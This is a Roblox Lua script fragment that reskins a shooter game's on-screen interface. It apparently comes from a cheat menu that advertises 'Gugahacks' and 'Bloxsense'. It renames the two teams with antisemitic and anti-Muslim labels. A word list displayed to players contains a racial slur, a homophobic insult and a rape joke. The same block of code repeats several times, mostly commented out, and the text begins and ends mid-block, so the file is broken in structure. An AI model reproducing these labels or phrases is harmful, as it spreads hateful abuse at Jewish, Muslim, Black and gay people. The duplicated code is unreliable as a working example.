	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

